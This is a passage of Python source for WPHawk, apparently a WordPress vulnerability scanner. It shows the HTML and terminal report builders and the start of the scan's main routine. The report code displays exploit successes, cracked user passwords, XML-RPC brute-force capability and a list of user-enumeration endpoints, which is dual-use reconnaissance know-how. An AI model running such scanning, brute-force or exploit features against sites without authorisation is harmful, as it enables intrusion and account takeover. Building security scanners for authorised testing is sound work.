        for x in result.exploit_results if x.success
    )

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WPHawk Report — {_html_esc(host)}</title>
<style>
  :root{{--bg:#0f172a;--card:#1e293b;--border:#334155;--text:#e2e8f0;--dim:#64748b;--accent:#38bdf8}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);padding:24px;font-size:14px}}
  h1{{font-size:1.6rem;color:var(--accent);margin-bottom:4px}}
  h2{{font-size:1.1rem;color:var(--accent);margin:0 0 12px}}
  .meta{{color:var(--dim);font-size:.85rem;margin-bottom:24px}}
  .stats{{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:28px}}
  .stat{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:16px 20px;min-width:130px}}
  .stat-num{{font-size:2rem;font-weight:700;line-height:1}}
  .stat-label{{color:var(--dim);font-size:.8rem;margin-top:4px}}
  .risk{{border-left:4px solid {risk_color}}}
  .section{{background:var(--card);border:1px solid var(--border);border-radius:8px;margin-bottom:20px;overflow:hidden}}
  .section-header{{padding:12px 16px;cursor:pointer;user-select:none;display:flex;align-items:center;gap:8px;font-weight:600}}
  .section-header:hover{{background:#ffffff08}}
  .section-body{{padding:16px;display:none}}
  .section-body.open{{display:block}}
  table{{width:100%;border-collapse:collapse;font-size:.85rem}}
  th{{text-align:left;color:var(--dim);font-weight:500;padding:6px 10px;border-bottom:1px solid var(--border)}}
  td{{padding:6px 10px;border-bottom:1px solid #1e293b;vertical-align:top}}
  tr:last-child td{{border-bottom:none}}
  code{{background:#0f172a;padding:2px 6px;border-radius:4px;font-size:.82rem;color:#7dd3fc}}
  a{{color:var(--accent);text-decoration:none}}a:hover{{text-decoration:underline}}
  .badge{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.75rem;font-weight:700;color:#fff}}
  .dim{{color:var(--dim)}}
  .toggle{{margin-left:auto;color:var(--dim);font-size:.8rem}}
  pre{{background:#0f172a;padding:12px;border-radius:6px;overflow-x:auto;font-size:.8rem;color:#94a3b8}}
  .wp-ver{{color:#22c55e;font-weight:700}}
  .waf-tag{{background:#1e3a5f;color:#7dd3fc;padding:2px 8px;border-radius:4px;font-size:.78rem}}
</style>
<script>
function toggle(id){{var b=document.getElementById(id);b.classList.toggle('open');}}
</script>
</head>
<body>
<h1>🦅 WPHawk Security Report</h1>
<div class="meta">Target: <strong>{_html_esc(result.target_url)}</strong> &nbsp;·&nbsp; Overall Risk: {badge(risk_level)}</div>

<div class="stats">
  <div class="stat risk">
    <div class="stat-num" style="color:{risk_color}">{_html_esc(risk_level)}</div>
    <div class="stat-label">Overall Risk</div>
  </div>
  <div class="stat">
    <div class="stat-num">{total_plugins + total_themes}</div>
    <div class="stat-label">Plugins / Themes</div>
  </div>
  <div class="stat">
    <div class="stat-num" style="color:{'#dc2626' if total_vulns else '#16a34a'}">{total_vulns}</div>
    <div class="stat-label">Unpatched CVEs</div>
  </div>
  <div class="stat">
    <div class="stat-num" style="color:{'#dc2626' if crit_vulns else '#e2e8f0'}">{crit_vulns}</div>
    <div class="stat-label">Critical CVEs</div>
  </div>
  <div class="stat">
    <div class="stat-num" style="color:{'#dc2626' if exposed_files else '#e2e8f0'}">{exposed_files}</div>
    <div class="stat-label">Exposed Files</div>
  </div>
  <div class="stat">
    <div class="stat-num" style="color:{'#dc2626' if sensitive_up else '#e2e8f0'}">{sensitive_up}</div>
    <div class="stat-label">Upload Finds</div>
  </div>
  <div class="stat">
    <div class="stat-num" style="color:{'#22c55e' if exploit_hits else '#e2e8f0'}">{exploit_hits}</div>
    <div class="stat-label">Exploits Hit</div>
  </div>
  <div class="stat">
    <div class="stat-num">{len(result.users)}</div>
    <div class="stat-label">Users Found</div>
  </div>
</div>

<!-- Fingerprint -->
<div class="section">
  <div class="section-header" onclick="toggle('s-fp')">
    🔍 Fingerprint <span class="toggle">▾</span>
  </div>
  <div class="section-body open" id="s-fp">
    <table>
      <tr><td>WordPress</td><td>{'<span style="color:#22c55e">YES</span>' if result.is_wordpress else '<span style="color:#dc2626">NO</span>'}</td></tr>
      <tr><td>Version</td><td><span class="wp-ver">{_html_esc(result.wp_version or 'Not detected')}</span>
          {'<span class="dim"> ('+_html_esc(', '.join(result.wp_version_sources))+')</span>' if result.wp_version_sources else ''}</td></tr>
      <tr><td>Server</td><td>{_html_esc(result.server_info.get('server','?'))}</td></tr>
      <tr><td>PHP</td><td>{_html_esc(result.server_info.get('php','?'))}</td></tr>
      <tr><td>WAF</td><td>{' '.join(f'<span class="waf-tag">{_html_esc(w)}</span>' for w in result.waf_list) if result.waf_list else '<span class="dim">None detected</span>'}</td></tr>
      <tr><td>Multisite</td><td>{'<span style="color:#f59e0b">YES</span>' if result.is_multisite else 'No'}</td></tr>
      <tr><td>Open Registration</td><td>{'<span style="color:#f59e0b">YES</span>' if result.registration_open else 'No'}</td></tr>
      <tr><td>Directory Listing</td><td>{'<span style="color:#dc2626">YES</span>' if result.directory_listing else 'No'}</td></tr>
      <tr><td>XML-RPC</td><td>{'<span style="color:#f59e0b">Accessible'+(', multicall enabled' if result.xmlrpc_multicall else '')+'</span>' if result.xmlrpc_accessible else 'Blocked'}</td></tr>
      <tr><td>GraphQL</td><td>{'<span style="color:#dc2626">Introspection OPEN: '+_html_esc(result.graphql_endpoint)+'</span>' if result.graphql_endpoint else 'Not detected'}</td></tr>
      {'<tr><td>Custom Admin URL</td><td><a href="'+_html_esc(result.custom_admin_url)+'" target="_blank">'+_html_esc(result.custom_admin_url)+'</a></td></tr>' if result.custom_admin_url else ''}
    </table>
  </div>
</div>

<!-- Plugins & Themes -->
<div class="section">
  <div class="section-header" onclick="toggle('s-plugins')">
    🔌 Plugins &amp; Themes ({total_plugins + total_themes} found) <span class="toggle">▾</span>
  </div>
  <div class="section-body open" id="s-plugins">
    <table>
      <tr><th>Slug</th><th>Type</th><th>Version</th><th>Detected By</th><th>CVEs</th></tr>
      {plugin_rows or '<tr><td colspan="5" class="dim">None detected</td></tr>'}
    </table>
  </div>
</div>

<!-- Upload Crawler -->
{'<div class="section"><div class="section-header" onclick="toggle(\'s-uploads\')">📁 Upload Crawler ('+str(len(result.upload_findings))+' findings) <span class="toggle">▾</span></div><div class="section-body open" id="s-uploads"><table><tr><th></th><th>Path / URL</th><th>Description</th><th>Size</th></tr>'+upload_rows+'</table></div></div>' if result.upload_findings else ''}

<!-- Drop-in files -->
{'<div class="section"><div class="section-header" onclick="toggle(\'s-dropin\')">🚨 Drop-in Files ('+str(len(result.dropin_findings))+' detected) <span class="toggle">▾</span></div><div class="section-body open" id="s-dropin"><table><tr><th>Status</th><th>Path</th><th>URL</th><th>Preview</th></tr>'+''.join('<tr><td><span style="color:'+('#dc2626' if f["status"]==200 else '#d97706')+'">HTTP '+str(f["status"])+'</span></td><td><code>'+_html_esc(f["path"])+'</code></td><td><a href="'+_html_esc(f["url"])+'" target="_blank">link</a></td><td class="dim">'+_html_esc(f.get("snippet","")[:80])+'</td></tr>' for f in result.dropin_findings)+'</table></div></div>' if result.dropin_findings else ''}

<!-- Users -->
<div class="section">
  <div class="section-header" onclick="toggle('s-users')">
    👤 Users ({len(result.users)} found) <span class="toggle">▾</span>
  </div>
  <div class="section-body" id="s-users">
    <table>
      <tr><th>Username</th><th>ID</th><th>Detected By</th><th>Password</th></tr>
      {user_rows or '<tr><td colspan="4" class="dim">None found</td></tr>'}
    </table>
  </div>
</div>

<!-- Sensitive Files -->
<div class="section">
  <div class="section-header" onclick="toggle('s-files')">
    🗂️ Sensitive Files ({exposed_files} exposed / {len(result.sensitive_files)} probed) <span class="toggle">▾</span>
  </div>
  <div class="section-body" id="s-files">
    <table>
      <tr><th>Path</th><th>Status</th></tr>
      {sf_rows or '<tr><td colspan="2" class="dim">None found</td></tr>'}
    </table>
  </div>
</div>

<!-- CVE Templates -->
{'<div class="section"><div class="section-header" onclick="toggle(\'s-cve\')">⚡ CVE Template Engine ('+str(len([t for t in result.template_results if t["success"]]))+'/'+str(len(result.template_results))+' confirmed) <span class="toggle">▾</span></div><div class="section-body open" id="s-cve"><table><tr><th></th><th>Severity</th><th>CVE</th><th>Plugin</th><th>Name</th><th>Evidence</th></tr>'+tmpl_rows+'</table></div></div>' if result.template_results else ''}

<!-- Exploitation -->
{'<div class="section"><div class="section-header" onclick="toggle(\'s-exploit\')">💥 Exploitation ('+str(exploit_hits)+' successful) <span class="toggle">▾</span></div><div class="section-body open" id="s-exploit"><table><tr><th></th><th>Plugin</th><th>CVE</th><th>Type</th><th>Evidence</th></tr>'+expl_rows+'</table></div></div>' if result.exploit_results else ''}

<!-- Security Headers -->
<div class="section">
  <div class="section-header" onclick="toggle('s-headers')">
    🛡️ Security Headers <span class="toggle">▾</span>
  </div>
  <div class="section-body" id="s-headers">
    <table>
      <tr><th>Header</th><th>Value</th></tr>
      {''.join('<tr><td><code>'+_html_esc(h)+'</code></td><td>'+('<span style="color:#dc2626">MISSING</span>' if not v else _html_esc(v[:120]))+'</td></tr>' for h,v in result.security_headers.items())}
    </table>
  </div>
</div>

<div class="meta" style="margin-top:24px">Generated by WPHawk v3.2 &nbsp;·&nbsp; {_html_esc(result.target_url)}</div>
</body>
</html>"""

    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html)
    ok(f"HTML report: {html_path}")
    return html_path


def generate_report(result, output_path=None, save_json=False, save_html=False):
    """
    Terminal-first report.  By default prints to stdout only.
    Pass save_json=True (--json) or save_html=True (--html) to also write files.
    Pass output_path to force a txt save.
    """
    host      = urlparse(result.target_url).netloc   # for file names
    base      = result.target_url                     # full URL for urljoin()
    json_path = os.path.join("output", f"report-{host}.json")
    html_path = os.path.join("output", f"report-{host}.html")

    col_lines = []
    TW = _term_width()

    def emit(line=""):
        col_lines.append(line)

    # ── Local ANSI shorthands (respect _COLOR_ENABLED globally) ─────────────
    DC = _ansi(C.DIM)  + _ansi(C.CYAN)
    Cy = _ansi(C.CYAN)
    Di = _ansi(C.DIM)
    Wh = _ansi(C.WHITE)
    Mg = _ansi(C.MAGENTA)
    Bo = _ansi(C.BOLD)
    RS = _ansi(C.RESET)
    RD = _ansi(C.RED)
    GR = _ansi(C.GREEN)
    BgR = _ansi(C.BG_RED)
    BgG = _ansi(C.BG_GREEN)

    def sec(title):
        pre = f"\n  {Mg}{Bo}◆{RS}  {Wh}{Bo}{title}{RS}  "
        pad = TW - len(_strip_ansi(pre))
        emit(f"{pre}{Di}{'╌' * max(pad, 2)}{RS}")

    # ── Report header ─────────────────────────────────────────────────────────
    inner    = min(TW - 6, 56)
    border   = '═' * inner
    url_line = result.target_url[:inner - 2]
    emit()
    emit(f"  {DC}╔{border}╗{RS}")
    emit(f"  {DC}║{RS}  {Wh}{Bo}WPHawk v3.2{RS}  {Di}·  Scan Report{' ' * (inner - 27)}{Cy}║{RS}")
    emit(f"  {DC}║{RS}  {Di}{url_line}{' ' * (inner - len(url_line) - 2)}{Cy}║{RS}")
    emit(f"  {DC}╚{border}╝{RS}")

    # ── Fingerprint
    sec("FINGERPRINT")
    emit(f"  {g('✔')}  WordPress  : {'YES' if result.is_wordpress else r('NO')}")
    if result.is_multisite:
        emit(f"  {y('▲')}  Multisite  : {y('YES')}  (Network installation)")
    if result.wp_version:
        emit(f"  {g('✔')}  Version    : {Wh}{result.wp_version}{RS}  {dim('(' + ', '.join(result.wp_version_sources) + ')')}")
    else:
        emit(f"  {dim('?')}  Version    : Not detected")
    emit(f"  {g('✔')}  Server     : {result.server_info.get('server','?')}")
    emit(f"  {g('✔')}  PHP        : {result.server_info.get('php','?')}")
    waf = result.server_info.get("waf","None detected")
    emit(f"  {y('▲') if waf != 'None detected' else dim('·')}  WAF        : {waf}")
    if result.custom_admin_url:
        emit(f"  {y('▲')}  Custom admin login: {result.custom_admin_url}")

    # ── Outdated plugins/themes — WPScan-style version report
    outdated = result.outdated_plugins
    if outdated:
        sec(f"OUTDATED PLUGINS/THEMES ({len(outdated)} found)")
        for e in outdated:
            vsrc_tag = f"  {dim(f'[ver:{e.version_source}]')}" if e.version_source else ""
            emit(f"  {r('▲')}  {Wh}{e.slug}{RS}{vsrc_tag}")
            emit(f"     {dim('Installed')} : {e.version or '?'}")
            emit(f"     {dim('Latest')}    : {g(e.latest_version)}  {dim('last updated: ' + str(e.last_updated))}")
            if e.vulnerable_cves:
                emit(f"     {r(f'⚠  {len(e.vulnerable_cves)} unpatched CVE(s)')}")
                for cve in e.vulnerable_cves[:5]:
                    tag = severity_tag(cve.severity, cve.cvss_score)
                    expl = g("  exploit available") if cve.exploit_available else ""
                    fix  = dim(f"  fixed in {cve.fixed_in}") if cve.fixed_in else ""
                    emit(f"       {tag}  {Wh}{cve.cve_id}{RS}{expl}{fix}")
                    emit(f"       {dim('╰─ ' + cve.description[:88])}")

    # ── WP Core CVEs
    if result.wp_core_cves:
        sec(f"WP CORE CVEs for {result.wp_version} ({len(result.wp_core_cves)} unpatched)")
        for cve in result.wp_core_cves[:10]:
            tag = severity_tag(cve.severity, cve.cvss_score)
            emit(f"  {tag} {cve.cve_id}  {dim(cve.description[:90])}")

    # ── All Plugins
    sec(f"PLUGINS ({len(result.plugins)} found)")
    for p in sorted(result.plugins, key=lambda x: len(x.vulnerable_cves), reverse=True):
        ver     = p.version or dim("?")
        latest  = f" → latest: {g(p.latest_version)}" if p.is_outdated and p.latest_version else ""
        vtag    = f"{RD}⚠ {len(p.vulnerable_cves)} CVE(s){RS}" if p.vulnerable_cves else f"{Di}clean{RS}"
        vsrc    = f"  {dim(p.version_source)}" if p.version_source else ""
        icon    = r('▲') if p.vulnerable_cves else g('✔')
        emit(f"  {icon}  {Wh}{p.slug}{RS}  {dim('v')}{ver}{latest}  {dim(p.detected_by)}{vsrc}  {vtag}")
        # URL: aggressive probe → show readme_url; passive → reconstruct from slug
        plug_url = p.readme_url or urljoin(base, f"wp-content/plugins/{p.slug}/")
        emit(f"       {Di}╰─ {plug_url}{RS}")
        for cve in p.vulnerable_cves[:3]:
            tag  = severity_tag(cve.severity, cve.cvss_score)
            expl = f"  {g('exploit available')}" if cve.exploit_available else ""
            fix  = dim(f"  fixed in {cve.fixed_in}") if cve.fixed_in else ""
            emit(f"       {tag}  {Wh}{cve.cve_id}{RS}{expl}{fix}")
            emit(f"       {dim('╰─ ' + cve.description[:88])}")

    # ── Themes
    sec(f"THEMES ({len(result.themes)} found)")
    for t in result.themes:
        ver    = t.version or dim("?")
        latest = f" → latest: {g(t.latest_version)}" if t.is_outdated and t.latest_version else ""
        vtag   = f"{RD}⚠ {len(t.vulnerable_cves)} CVE(s){RS}" if t.vulnerable_cves else f"{Di}clean{RS}"
        vsrc   = f"  {dim(t.version_source)}" if t.version_source else ""
        icon   = r('▲') if t.vulnerable_cves else g('✔')
        emit(f"  {icon}  {Wh}{t.slug}{RS}  {dim('v')}{ver}{latest}  {dim(t.detected_by)}{vsrc}  {vtag}")
        theme_url = t.readme_url or urljoin(base, f"wp-content/themes/{t.slug}/")
        emit(f"       {Di}╰─ {theme_url}{RS}")

    # ── Users
    sec(f"USERS ({len(result.users)} found)")
    _user_src_urls = {
        "rest_api":        urljoin(base, "wp-json/wp/v2/users"),
        "author_redirect": None,   # built per-user below using u.id
        "oembed":          urljoin(base, "wp-json/oembed/1.0/embed"),
        "rss_feed":        urljoin(base, "?feed=rss2"),
        "wp_sitemap":      urljoin(base, "wp-sitemap-users-1.xml"),
        "lostpassword":    urljoin(base, "wp-login.php?action=lostpassword"),
        "graphql":         result.graphql_endpoint or urljoin(base, "graphql"),
        "login_error":     urljoin(base, "wp-login.php"),
    }
    for u in result.users:
        pwd  = f"  {BgG}{Bo} {u.password} {RS}" if u.password else ""
        icon = r('▲') if u.password else y('◈')
        emit(f"  {icon}  {Wh}{u.slug}{RS}  {dim('id:'+str(u.id))}  {dim(u.detected_by)}{pwd}")
        if u.detected_by == "author_redirect" and u.id:
            src_url = urljoin(base, f"?author={u.id}")
        else:
            src_url = _user_src_urls.get(u.detected_by, "")
        if src_url:
            emit(f"       {Di}╰─ {src_url}{RS}")

    # ── REST API
    if result.rest_endpoints:
        unauthed = [e for e in result.rest_endpoints if not e.auth_required]
        sec(f"REST API ({len(result.rest_endpoints)} routes, {len(unauthed)} unauthenticated)")
        for e in unauthed[:15]:
            emit(f"  {y('▲')}  {e.route}  {dim('[' + ', '.join(e.methods) + ']')}")
            if e.response_preview:
                emit(f"       {dim('╰─ ' + e.response_preview[:80])}")

    # ── JS Findings
    if result.js_findings:
        sec(f"JS ANALYSIS ({len(result.js_findings)} findings)")
        seen_types = {}
        for f in result.js_findings:
            if f.finding_type not in seen_types:
                seen_types[f.finding_type] = 0
            seen_types[f.finding_type] += 1
        for ftype, count in seen_types.items():
            emit(f"  {y('▲')}  {ftype}: {count} occurrence(s)")
        high_value = [f for f in result.js_findings if f.finding_type in ("API Key","Secret","AWS Key","Bearer Token","WP Nonce")]
        for f in high_value[:10]:
            emit(f"  {r('✘')}  {Wh}{f.finding_type}{RS}: {f.value[:80]}")
            emit(f"       {dim('╰─ ' + f.js_url[:80])}")

    # ── robots.txt
    if result.robots_paths:
        sec(f"ROBOTS.TXT ({len(result.robots_paths)} Disallow paths)")
        for path in result.robots_paths[:20]:
            emit(f"  {y('▲')}  Disallow: {path}")

    # ── Subdomains
    if result.subdomains:
        sec(f"SUBDOMAINS ({len(result.subdomains)} via crt.sh)")
        for sub in result.subdomains[:20]:
            emit(f"  {g('✔')}  {sub}")
        if len(result.subdomains) > 20:
            emit(f"  {dim(f'  … and {len(result.subdomains)-20} more')}")

    # ── Sensitive files
    sec("SENSITIVE FILES")
    for f in result.sensitive_files:
        file_url = f.get("url") or urljoin(base, f["path"])
        if f["status"] == 200:
            emit(f"  {r('✘')}  {BgR}{Wh} EXPOSED {RS}  {Wh}{file_url}{RS}")
        else:
            emit(f"  {dim('?')}  {dim('403')}  {dim(file_url)}")

    # ── XML-RPC
    sec("XML-RPC")
    if result.xmlrpc_accessible:
        emit(f"  {r('▲')}  xmlrpc.php accessible")
        emit(f"  {r('▲') if result.xmlrpc_multicall else dim('·')}  system.multicall: {'enabled — amplified brute possible' if result.xmlrpc_multicall else 'disabled'}")
    else:
        emit(f"  {g('✔')}  xmlrpc.php not accessible")

    # ── Misc
    sec("MISC CHECKS")
    emit(f"  {r('▲') if result.registration_open else g('✔')}  Open registration : {'YES' if result.registration_open else 'NO'}")
    emit(f"  {r('▲') if result.directory_listing else g('✔')}  Directory listing : {'YES' if result.directory_listing else 'NO'}")
    emit(f"  {r('▲') if result.wpcron_exposed   else g('✔')}  wp-cron exposed   : {'YES' if result.wpcron_exposed   else 'NO'}")

    # ── Security headers
    sec("SECURITY HEADERS")
    for h, val in result.security_headers.items():
        emit(f"  {g('✔') if val else r('✘')}  {h}: {val if val else r('MISSING')}")

    # ── Debug log findings
    if result.debug_log_findings:
        sec(f"DEBUG.LOG ({len(result.debug_log_findings)} finding(s))")
        for f in result.debug_log_findings[:10]:
            emit(f"  {r('✘')}  {dim('['+f['type']+']')} {f['value'][:110]}")

    # ── Backup files
    if result.backup_files:
        sec(f"BACKUP FILES ({len(result.backup_files)} exposed)")
        for b in result.backup_files:
            emit(f"  {r('✘')}  {b['url']}  {dim('(' + str(b.get('size','?')) + ' bytes)')}")

    # ── TimThumb
    if result.timthumb_findings:
        vuln = [t for t in result.timthumb_findings if t.get("vulnerable")]
        sec(f"TIMTHUMB ({len(result.timthumb_findings)} found, {len(vuln)} vulnerable)")
        for t in result.timthumb_findings:
            icon = r('✘') if t.get("vulnerable") else y('▲')
            tag  = f"{BgR}{Wh} VULN CVE-2011-4106 {RS}" if t.get("vulnerable") else dim("exists")
            emit(f"  {icon}  {tag}  {t['url']}  {dim('v'+str(t['version']))}")

    # ── HTTP methods
    if result.http_method_findings:
        sec(f"DANGEROUS HTTP METHODS ({len(result.http_method_findings)} endpoint(s))")
        for f in result.http_method_findings:
            emit(f"  {r('▲')}  {f['url']}")
            emit(f"       {dim('Methods: ' + ', '.join(f['methods']) + '  Allow: ' + f.get('allow','?'))}")

    # ── Login-error confirmed users
    if result.login_confirmed_users:
        sec(f"LOGIN-ERROR ENUM ({len(result.login_confirmed_users)} username(s) confirmed)")
        for slug in result.login_confirmed_users:
            emit(f"  {g('✔')}  {Wh}{slug}{RS}  {dim('confirmed via wp-login.php error')}")

    # ── CVE template results
    if result.template_results:
        hits = [t for t in result.template_results if t["success"]]
        sec(f"CVE TEMPLATE ENGINE ({len(hits)}/{len(result.template_results)} confirmed)")
        sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
        sorted_results = sorted(
            result.template_results,
            key=lambda t: (0 if t["success"] else 1, sev_order.get(t["severity"], 9), -t["cvss_score"])
        )
        for t in sorted_results:
            tag  = severity_tag(t["severity"], t["cvss_score"])
            icon = f"{BgG}{Wh}{Bo} ✔ CONFIRMED {RS}" if t["success"] else dim("· not triggered")
            emit(f"  {icon}  {tag}  {Wh}{t['id']}{RS}  {dim(t['slug']+'  v'+(t['version'] or '?'))}")
            emit(f"       {dim('╰─ ' + t['name'][:88])}")
            if t["success"] and t["evidence"]:
                emit(f"       {y('Evidence')} {t['evidence'][:100]}")
                emit(f"       {dim('URL: ' + t['url'][:100])}")

    # ── Upload crawler findings
    if result.upload_findings:
        dir_listings = [f for f in result.upload_findings if "dir_listing" in f["type"]]
        sensitive    = [f for f in result.upload_findings
                        if f["type"] in ("sensitive_upload_file","listed_sensitive_file")]
        sec(f"UPLOAD CRAWLER ({len(result.upload_findings)} findings — "
            f"{len(dir_listings)} open dirs · {len(sensitive)} sensitive files)")
        for f in dir_listings[:12]:
            emit(f"  {r('▲')}  DIR LISTING: {f['url']}")
        for f in sensitive[:20]:
            emit(f"  {r('✘')}  {f.get('url', f.get('path','?'))}")
            if f.get("size") and f["size"] != "?":
                emit(f"       {dim('size: '+str(f['size'])+' bytes  type: '+f.get('content_type','?')[:50])}")
        if len(sensitive) > 20:
            emit(f"  {dim(f'  … and {len(sensitive)-20} more')}")

    # ── Drop-in files
    if result.dropin_findings:
        exposed = [f for f in result.dropin_findings if f["status"] == 200]
        sec(f"DROP-IN FILES ({len(result.dropin_findings)} detected, "
            f"{len(exposed)} directly readable)")
        for f in result.dropin_findings:
            if f["status"] == 200:
                emit(f"  {r('✘')}  {BgR}{Wh} ACCESSIBLE {RS}  {f['url']}")
                if f.get("snippet"):
                    emit(f"       {dim('╰─ ' + f['snippet'][:100])}")
            else:
                emit(f"  {dim('?')}  EXISTS (403): {f['path']}")

    # ── MU-plugins
    if result.mu_plugin_findings:
        files = [f for f in result.mu_plugin_findings if f["type"] == "mu_plugin_file"]
        sec(f"MU-PLUGINS ({len(result.mu_plugin_findings)} findings, "
            f"{len(files)} PHP files exposed)")
        for f in result.mu_plugin_findings:
            if f["type"] == "dir_listing":
                emit(f"  {r('▲')}  DIR LISTING: {f['url']}")
            elif f["type"] == "mu_plugin_file":
                emit(f"  {r('✘')}  {Wh}{f['name']}{RS}  →  {dim(f['url'])}")
            else:
                emit(f"  {dim('?')}  mu-plugins/ exists (403 blocked)")

    # ── GraphQL
    if result.graphql_endpoint:
        sec("GRAPHQL")
        emit(f"  {r('▲')}  {BgR}{Wh} Introspection OPEN {RS}  {result.graphql_endpoint}")
        emit(f"       {dim(f'Types exposed: {len(result.graphql_types)}')}")
        if result.graphql_types:
            emit(f"       {dim(', '.join(result.graphql_types[:20]))}")

    # ── Exploitation summary
    successes = [x for x in result.exploit_results if x.success]
    if successes:
        sec(f"EXPLOITATION SUMMARY ({len(successes)} successful)")
        for xr in successes:
            emit(f"  {BgG}{Wh}{Bo} ✔ PWNED {RS}  {Wh}{xr.plugin_slug}{RS}  {dim(xr.cve_id)}  {dim(xr.exploit_type)}")
            emit(f"       {dim('╰─ ' + xr.evidence[:120])}")

    # ── Summary box ───────────────────────────────────────────────────────────
    vuln_p  = sum(1 for p in result.plugins if p.vulnerable_cves)
    vuln_t  = sum(1 for t in result.themes  if t.vulnerable_cves)
    crit_c  = sum(1 for c in result.wp_core_cves if c.severity == "CRITICAL")
    sf_exp  = sum(1 for f in result.sensitive_files if f["status"] == 200)
    tmpl_h  = sum(1 for t in (result.template_results or []) if t.get("success"))

    def _row(label, val, extra=""):
        L = 16
        lbl = f"{Di}{label:<{L}}{RS}"
        return f"  {Di}║{RS}  {lbl}  {Wh}{val}{RS}  {Di}{extra}{RS}"

    bw = min(TW - 6, 56)
    bb = '═' * bw
    emit()
    emit(f"  {Cy}{Di}╔{bb}╗{RS}")
    emit(f"  {Di}║{RS}  {Cy}{Bo}SUMMARY{RS}{' ' * (bw - 9)}{Di}║{RS}")
    emit(f"  {Cy}{Di}╠{bb}╣{RS}")
    emit(_row("Target",   result.target_url[:bw-20]))
    emit(_row("WordPress", result.wp_version or "Not detected"))
    emit(_row("Plugins",  f"{len(result.plugins)}", f"({vuln_p} vulnerable)" if vuln_p else ""))
    emit(_row("Themes",   f"{len(result.themes)}",  f"({vuln_t} vulnerable)" if vuln_t else ""))
    emit(_row("Users",    f"{len(result.users)}"))
    emit(_row("Core CVEs",f"{len(result.wp_core_cves)}", f"({crit_c} critical)" if crit_c else ""))
    emit(_row("Exposed",  f"{sf_exp} file(s)"))
    if tmpl_h:
        emit(_row("Templates", f"{tmpl_h} hit(s)"))
    emit(f"  {Cy}{Di}╠{bb}╣{RS}")
    if save_json:   emit(f"  {Di}║  JSON  →  {json_path:<{bw-10}}{RS}  {Di}║{RS}")
    if save_html:   emit(f"  {Di}║  HTML  →  {html_path:<{bw-10}}{RS}  {Di}║{RS}")
    if output_path: emit(f"  {Di}║  TXT   →  {output_path:<{bw-10}}{RS}  {Di}║{RS}")
    emit(f"  {Cy}{Di}╚{bb}╝{RS}")

    # ── Print to terminal (always) ────────────────────────────────────────────
    print("\n".join(col_lines))

    # ── Optional file outputs ─────────────────────────────────────────────────
    if output_path:
        os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(_strip_ansi("\n".join(col_lines)))

    if save_json:
        os.makedirs("output", exist_ok=True)
        def serial(obj):
            if hasattr(obj, "__dataclass_fields__"):
                return {k: serial(v) for k, v in obj.__dict__.items()}
            if isinstance(obj, list):
                return [serial(i) for i in obj]
            return obj
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(serial(result), f, indent=2, default=str)

    if save_html:
        os.makedirs("output", exist_ok=True)
        generate_html_report(result, html_path)

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
async def main(args):
    print_banner()
    base_url = normalize_url(args.url)
    result   = ScanResult(target_url=base_url)
    info(f"Target: {base_url}")

    if getattr(args, "full_scan", False):
        w = _term_width()
        tag = f"{_ansi(C.BG_RED)}{_ansi(C.WHITE)}{_ansi(C.BOLD)} FULL SCAN {_ansi(C.RESET)}"
        msg = f"  {tag}  ALL modules active — aggressive · deep recon · CVE · exploits · brute"
        pad = w - len(_strip_ansi(msg))
        print(f"{msg}{_ansi(C.DIM)}{'─' * max(pad, 2)}{_ansi(C.RESET)}")

    # ── Proxy support ─────────────────────────────────────────────────────────
    if args.proxy:
        os.environ["HTTP_PROXY"]  = args.proxy
        os.environ["HTTPS_PROXY"] = args.proxy
        info(f"Proxy: {args.proxy}")

    # ── Custom User-Agent ──────────────────────────────────────────────────────
    if args.custom_ua:
        USER_AGENTS.insert(0, args.custom_ua)
        info(f"User-Agent: {args.custom_ua}")

    db      = await init_db() if args.cve else None
    timeout = aiohttp.ClientTimeout(total=args.timeout)
    conn    = aiohttp.TCPConnector(ssl=not args.no_verify_ssl, limit=args.concurrency * 2)

    # ── Rate limiter ──────────────────────────────────────────────────────────
    limiter = RateLimiter(rps=args.rps)
    if args.rps > 0:
        info(f"Rate limit: {args.rps:.1f} req/s  (--rps 0 to disable)")
    else:
        warn("Rate limit: DISABLED — watch your target's error rate")

    # Build session headers (cookie support)
    base_headers = {}
    if args.cookie:
        base_headers["Cookie"] = args.cookie
        info("Cookie auth provided — will be sent with all requests")

    async with aiohttp.ClientSession(connector=conn, timeout=timeout,
                                     headers=base_headers,
                                     trust_env=bool(args.proxy)) as _raw_session:
        # Wrap raw session — every .get/.post/.head now goes through the limiter
        session = RateLimitedSession(_raw_session, limiter)

        # ── Phase 1: Fingerprint ─────────────────────────────────────────────
        section("PHASE 1 — FINGERPRINTING")
        html, resp = await fetch_homepage(session, base_url, args.timeout)
        is_wp = await detect_wordpress(session, result, html, resp)
        if resp:
            await detect_server_info(session, result, resp)
            await detect_waf_advanced(session, result, resp, html)
        if not is_wp:
            await check_security_headers(session, result)
            generate_report(result, args.output, args.json, args.html)
            print(f"\n  {_ansi(C.DIM)}Scan stats: {limiter.stats()}{_ansi(C.RESET)}\n")
            if db:
                await db.close()
            return
        await detect_wp_version(session, result, html)
        if result.wp_version:
            ok(f"WordPress {result.wp_version} ({', '.join(result.wp_version_sources)})")
        else:
            warn("WordPress version not detected")
        # Multisite + custom admin path (fast, run in parallel)
        await asyncio.gather(
            detect_multisite(session, result, html),
            detect_custom_admin_path(session, result),
            return_exceptions=True
        )
        if result.is_multisite:
            warn("WordPress Multisite / Network installation detected")
        if result.custom_admin_url:
            warn(f"Custom admin login path: {result.custom_admin_url}")

        # ── Phase 2: Enumeration ─────────────────────────────────────────────
        section("PHASE 2 — ENUMERATION")
        enum = set([args.enumerate]) if "," not in args.enumerate else set(args.enumerate.split(","))
        do_p = "plugins" in enum or "all" in enum
        do_t = "themes"  in enum or "all" in enum
        do_u = "users"   in enum or "all" in enum

        if do_p:
